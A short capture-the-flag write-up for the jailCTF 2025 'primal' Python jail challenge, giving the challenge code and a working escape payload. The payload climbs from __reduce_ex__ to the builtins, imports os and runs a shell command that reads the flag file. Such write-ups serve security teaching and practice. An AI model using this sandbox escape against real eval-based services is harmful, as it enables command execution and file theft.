# jailCTF 2025 primal

```python
#!/usr/local/bin/python3
import re

isPrime = lambda num: num > 1 and all(num % i != 0 for i in range(2, num))

code = input("Prime Code > ")

if len(code) > 200 or not code.isascii() or "eta" in code:
    print("Relax")
    exit()

for m in re.finditer(r"\w+", code):
    if not isPrime(len(m.group(0))):
        print("Nope")
        exit()

eval(code, {'__builtins__': {}})
```

Requirements:

1. No `eta`: no getattr/setattr, use `obj[name]` to access fields
2. No builtins: use `().__reduce_ex__(2)[0].__globals__['__builtins__']['__import__']('os')` to get os
3. Words should have prime length: use `'aa'.__len__()` for `2`, use `\xXX` in strings

According to [mirelgigel/writeupjailctf](https://github.com/mirelgigel/writeupjailctf), the solution is:

```python
().__reduce_ex__('aa'.__len__())[False].__globals__['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('os').execl('/bin/sh','sh','\x2d\x63','cat *\x66*')
```

1. Use `__reduce_ex__` (length 13) as the starting point
2. Use `'aa'.__len__()` instead of `2`
3. Use `False` (length 5) instead of `0`
4. For strings, use `\xXX` (length 3) to avoid length problems
5. Use `execl` (length 5) instead of `system`
